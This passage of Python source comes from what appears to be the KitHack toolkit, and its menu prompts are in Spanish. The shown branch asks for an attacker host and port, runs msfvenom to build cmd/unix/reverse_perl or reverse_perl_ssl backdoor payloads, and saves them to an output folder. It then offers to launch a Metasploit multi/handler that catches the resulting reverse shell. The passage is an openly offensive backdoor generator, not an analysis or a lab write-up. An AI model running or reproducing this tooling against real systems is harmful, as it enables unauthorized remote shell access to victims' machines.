				os.system('clear')
				banner(), menu(), options()	

		elif sys == 8:
			print '{0}\n [*] {1}Select Payload:\n'.format(DEFAULT, GREEN)			
			print '{0}[01]{1} cmd/unix/reverse_perl'.format(WHITE, YELLOW)
			print '{0}[02]{1} cmd/unix/reverse_perl_ssl'.format(WHITE, YELLOW)

			pay = input("{0}KitHack >> {1}".format(RED, DEFAULT))

			if pay == 1:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p cmd/unix/reverse_perl LHOST={0} LPORT={1} -f raw > output/{2}.pl'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.pl'.format(OUT)).st_size != 0:
					print("Backdoor guardado en {0}/output/{1}.pl".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD cmd/unix/reverse_perl; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()				
				else:	
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()						
			
			elif pay == 2:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p cmd/unix/reverse_perl_ssl LHOST={0} LPORT={1} -f raw > output/{2}.pl'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.pl'.format(OUT)).st_size != 0:
					print("Backdoor guardado en {0}/output/{1}.pl".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD cmd/unix/reverse_perl_ssl; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()	

			else:
				print("\n{}[X] OPCION INVALIDA\n".format(RED))
				time.sleep(3)
				pause("{}Presione cualquier tecla para continuar...".format(GREEN))
				os.system('clear')
				banner(), menu(), options()

		else:
			print("\n{}[X] OPCION INVALIDA\n".format(RED))
			time.sleep(3)
			pause("{}Presione cualquier tecla para continuar...".format(GREEN))
			os.system('clear')
			banner(), menu(), options()

	elif option == 11:
		os.system("firefox https://github.com/AdrMXR")
		os.system('clear')
		banner(), menu(), options()	

	elif option == 12:
		pause("\n{}Presione cualquier tecla para salir...".format(GREEN))
		time.sleep(1)
		os.system('clear')
		exit(0)

	else:
		print("\n{}[X] OPCION INVALIDA\n".format(RED))
		time.sleep(3)
		os.system('clear')
		banner(), menu(), options()


if __name__ == "__main__":
	check()
	menu()
	options()

	

